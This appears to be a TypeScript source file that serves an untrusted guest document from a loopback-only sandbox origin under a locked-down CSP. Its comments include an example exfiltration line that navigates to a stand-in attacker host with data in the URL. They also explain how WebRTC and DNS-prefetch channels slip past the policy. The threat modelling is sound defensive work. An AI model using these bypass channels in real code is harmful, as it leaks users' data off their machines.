/**
 * quick-studio Core — the Ring 3 sandbox origin (Story 5.5).
 *
 * A SECOND `Bun.serve` on a distinct loopback port — a genuinely separate origin
 * from the Core (a subpath cannot be a distinct origin; a distinct port is). It
 * serves ONLY the untrusted guest document + its own JS bundle, under a locked-down
 * CSP (`default-src 'none'; connect-src 'none'`). It exposes NO session token, NO
 * `/rpc`, NO `/chat/stream`, and no credentials — everything else is a bare 404.
 *
 * The guest served here is embedded by Ring 2 in a `sandbox="allow-scripts"` iframe
 * WITHOUT `allow-same-origin`, so the browser gives it an opaque origin and the two
 * layers of the boundary compose: cross-origin isolation + `connect-src 'none'` egress
 * block + a data-endpoint-free origin. Core's `stop()` tears this server down too.
 *
 * This server binds LOOPBACK in every configuration (DW-48). It used to take the Core's
 * bind host verbatim — "the SAME host Core binds" — which meant `QS_HOST=0.0.0.0` handed
 * the tokenless guest origin to the whole LAN, an origin with no credential to check and
 * therefore no gate to fail closed. {@link sandboxBindHost} now clamps the requested host
 * inside {@link startSandboxServer}, so the guarantee is a property of the sandbox origin
 * itself rather than of any one call site: no caller can bind the guest off-loopback by
 * passing the wrong host. ONE seam sits outside that guarantee, named here rather than
 * left implied — `StartCoreOptions.startSandboxServer` lets a caller (today: tests)
 * replace this factory wholesale, and `startCore` does not check the origin it gets back.
 * The clamp therefore covers every real boot, but an injected factory is trusted, not
 * verified.
 *
 * The accepted consequence, recorded here because it is a real cost and not an oversight:
 * in exposed mode a REMOTE browser resolves the injected `__QS_SANDBOX_ORIGIN__` against
 * its OWN loopback, so a CHAT answer carrying a chart does not render off-host. What is
 * lost is the chart plus the prose narration it displaces (`decideMessageView` suppresses
 * the bubble for a chart-bearing answer); the generated SQL and the full result table
 * still render, since `ChatQueryRun` is not gated on the chart. The Report tab is
 * unaffected — it draws in-app with Recharts, not in this sandbox.
 */

import { deriveOpenUrl, sandboxBindHost } from "./binding.ts";

/** The injected guest bundle (defaults to the build-time generated module). */
export type SandboxBundle = {
  readonly js: string;
};

export type StartSandboxServerOptions = {
  /**
   * The REQUESTED bind host — clamped to loopback by {@link sandboxBindHost} before it
   * reaches `Bun.serve` (DW-48). A loopback value binds verbatim; anything else (the
   * Core's exposed `QS_HOST`, a routable IP, a hostname) binds the same-family loopback
   * instead. Callers pass their intent; this server decides what it is willing to listen on.
   */
  readonly host: string;
  /** Port; `0` (default) picks an ephemeral port. */
  readonly port?: number;
  /** The guest JS bundle to serve at `/guest.js`. Injected so tests need no build. */
  readonly bundle: SandboxBundle;
};

export type SandboxServer = {
  /** The actual bound port (resolved even when `0` was requested). */
  readonly port: number;
  /**
   * The NAVIGABLE origin (`http://<host>:<port>`) Ring 2 points the iframe `src` at.
   * Derived via {@link deriveOpenUrl} from the SAME clamped host the server binds, so a
   * bare IPv6 literal is bracketed (`::1`→`[::1]`) and, critically, the socket and this
   * string can never name different hosts: whatever `__QS_SANDBOX_ORIGIN__` points at is
   * an origin this server is actually listening on.
   */
  readonly origin: string;
  /** Stop the server and release the port. May be awaited. */
  stop(): void | Promise<void>;
};

/**
 * The exact guest-document CSP (Story 5.5 contract). `default-src 'none'` denies
 * everything not explicitly re-allowed; `script-src 'self'` permits only the same-
 * origin `/guest.js` (never inline script); `style-src 'unsafe-inline'` allows the
 * doc's own `<style>`; `img-src data:` permits inline data-URI images; `connect-src
 * 'none'` is the egress block (no fetch/XHR/WebSocket/EventSource can leave); and
 * `base-uri 'none'` / `form-action 'none'` close the remaining exfil vectors.
 *
 * What `connect-src 'none'` does NOT cover, because the phrase "egress block" reads
 * stronger than it is (DW-47) — and read the list below as the channels we have actually
 * reasoned through, NOT as a proof that no others exist: it governs scripted REQUESTS,
 * not scripted NAVIGATION. A hostile guest bundle cannot `fetch` the pushed `FrozenData`
 * anywhere, but
 * it can still assign `window.location = "http://attacker.example/?" + data` and carry
 * that payload off-machine in the URL of its own same-frame navigation. Nothing in THIS
 * policy stops that: `form-action` covers form submission, `base-uri` covers base-tag
 * hijacking, and neither is a navigation source directive. The iframe's `sandbox` token
 * list does not stop it either — a frame may navigate ITSELF without
 * `allow-top-navigation`; that token only governs navigating the TOP-level browsing
 * context. The dedicated directive, `navigate-to`, was dropped from CSP before it shipped.
 *
 * Navigation is not the ONLY channel this policy leaves open, and saying so matters more
 * than the tidiness of a single named residual — a future "we blocked navigation, the
 * residual is closed" would be wrong. `RTCPeerConnection` is governed by CSP3's `webrtc`
 * directive, which is not set here and does NOT fall back to `default-src`, so a hostile
 * bundle can raise a peer connection and leak through STUN/TURN candidates without
 * navigating at all. `<link rel="dns-prefetch">` / `rel="preconnect"` are speculative
 * connections no current fetch directive constrains, which buys a low-bandwidth DNS-label
 * channel. Both survive the `frame-src` mitigation below, which is a NAVIGATION control
 * and does nothing for either.
 *
 * One mitigation DOES already apply and is worth stating so the residual is not read as
 * wider than it is: the EMBEDDER's policy governs navigations of a nested browsing
 * context, and `shellCspHeaders` emits `frame-src <sandboxOrigin>` — a source list holding
 * exactly this origin. Chromium and Gecko enforce that on the child frame's own
 * navigations, so in practice a guest that assigns `window.location` to a remote host is
 * blocked, and a navigation it IS allowed (back to this origin, query string and all)
 * reaches nothing but our own 404 handler and never leaves the machine. Do not read that
 * as "closed", which is why the residual stands rather than being retired: `frame-src` is
 * a FRAMING control being leaned on as an egress control, it lives in a different policy
 * on a different origin from the guest it would be protecting, and its enforcement on
 * child self-navigation is engine behavior no test in this repo pins. A containment
 * argument that depends on a control nobody wrote for the purpose and nobody asserts is a
 * residual, not a guarantee. It also quietly depends on `allow-popups` staying ABSENT from
 * the iframe's `sandbox` token list (`sandbox-host.ts`): add that token and `window.open`
 * reopens the channel in an auxiliary browsing context, which `frame-src` does not govern
 * at all.
 *
 * That residual is ACCEPTED, not overlooked. The threat model here is a compromised or
 * malicious guest BUNDLE, and the only thing it ever receives is the output of a query the
 * user just ran and is already looking at on their own screen — the guest is handed no
 * token, no connection handle, no capability to run another query, and nothing belonging
 * to anyone but the operator. The exfil-to-self a navigation would buy is worth less than
 * the containment we would trade for it. REVISIT THIS the moment the product introduces
 * untrusted or shared reports — a guest rendering someone else's data, a report authored
 * by a third party, or any multi-tenant surface — because at that point the payload stops
 * being "the viewer's own output" and this trade stops holding.
 *
 * `frame-ancestors` is intentionally NOT set: the guest is embedded by the Core
 * document, which lives on a DIFFERENT loopback port (a different origin), so any
 * origin-exact `frame-ancestors` value (`'self'`, or the guest's own origin) would
 * make a spec-compliant browser REFUSE to render the guest in the Core iframe and
 * break the entire Ring 2 -> Ring 3 loop. Clickjacking is a non-threat here: the
 * guest holds no session token, no ambient authority, and no secret to steal, and it
 * only ever accepts data from — and emits signals to — its pinned parent window.
 */
const GUEST_CSP =
  "default-src 'none'; script-src 'self'; style-src 'unsafe-inline'; img-src data:; connect-src 'none'; base-uri 'none'; form-action 'none'";

/**
 * Headers for the guest HTML document: the locked-down CSP + `nosniff` + `no-store`.
 * Pure builder, exported for unit-testing the exact header set without a live server.
 */
export function sandboxCspHeaders(): Record<string, string> {
  return {
    "content-type": "text/html; charset=utf-8",
    "content-security-policy": GUEST_CSP,
    "x-content-type-options": "nosniff",
    "cache-control": "no-store",
  };
}

/** Headers for the guest JS bundle: same-origin script, `nosniff`, `no-store`. */
function guestJsHeaders(): Record<string, string> {
  return {
    "content-type": "text/javascript; charset=utf-8",
    "x-content-type-options": "nosniff",
    "cache-control": "no-store",
  };
}

/**
 * Render the guest HTML document. Pure and static: it carries NO token and NO inline
 * data — it only loads the same-origin `/guest.js` module (the sole script the CSP
 * admits) and its own inline `<style>`. Ring 2 pushes the frozen data in over
 * `postMessage` after load; nothing sensitive is ever baked into this markup.
 * Exported for unit-testing the served body without booting a server.
 */
export function renderGuestHtml(): string {
  return `<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>quick-studio sandbox</title>
    <style>
      body { margin: 0; font: 13px/1.45 system-ui, sans-serif; color: #1a1a1a; }
      table.qs-frozen { border-collapse: collapse; width: 100%; }
      .qs-frozen th, .qs-frozen td { border: 1px solid #d0d0d0; padding: 2px 6px; text-align: left; }
      .qs-frozen th { background: #f4f4f4; font-weight: 600; }
      .qs-frozen td { cursor: pointer; }
      .qs-frozen td:hover { background: #eef4ff; }
    </style>
  </head>
  <body>
    <script type="module" src="/guest.js"></script>
  </body>
</html>
`;
}

/**
 * Boot the sandbox origin. Serves `GET /` (+ `/index.html`) as the guest document
 * and `GET /guest.js` as the injected bundle; EVERYTHING else — including `/rpc`,
 * `/chat/stream`, and any other path or method — is a bare 404 with no dispatch and
 * no token in any response. Resolves once listening; wired into Core's `stop()`.
 *
 * The requested `host` is clamped to loopback ONCE, here, and that single value feeds both
 * `Bun.serve({hostname})` and `deriveOpenUrl` (DW-48). There is deliberately exactly one
 * host binding in this function: the bug class this closes is not "we bound too widely" on
 * its own but "the bind and the advertised origin drifted apart", and two variables is all
 * it takes for them to drift again.
 */
export function startSandboxServer(options: StartSandboxServerOptions): SandboxServer {
  const { host: requestedHost, port = 0, bundle } = options;
  // The ONE host value in this function — see the module docstring for why the guest
  // origin refuses to listen anywhere the LAN can reach, tokenless as it is.
  const host = sandboxBindHost(requestedHost);
  const guestHtml = renderGuestHtml();

  const server = Bun.serve({
    hostname: host,
    port,
    fetch(req): Response {
      const url = new URL(req.url);
      if (req.method === "GET" && (url.pathname === "/" || url.pathname === "/index.html")) {
        return new Response(guestHtml, { status: 200, headers: sandboxCspHeaders() });
      }
      if (req.method === "GET" && url.pathname === "/guest.js") {
        return new Response(bundle.js, { status: 200, headers: guestJsHeaders() });
      }
      // No data endpoints exist on this origin — /rpc, /chat/stream, and everything
      // else is a bare 404. No token, no credentials, no dispatch.
      return new Response("Not found", {
        status: 404,
        headers: { "content-type": "text/plain; charset=utf-8", "x-content-type-options": "nosniff" },
      });
    },
  });

  const boundPort = server.port ?? 0;
  return {
    port: boundPort,
    // Navigable form (bare IPv6 bracketed) of the SAME clamped `host` bound above — the
    // iframe `src` / injected origin therefore always names a socket we are listening on.
    origin: deriveOpenUrl(host, boundPort),
    stop: () => server.stop(true),
  };
}
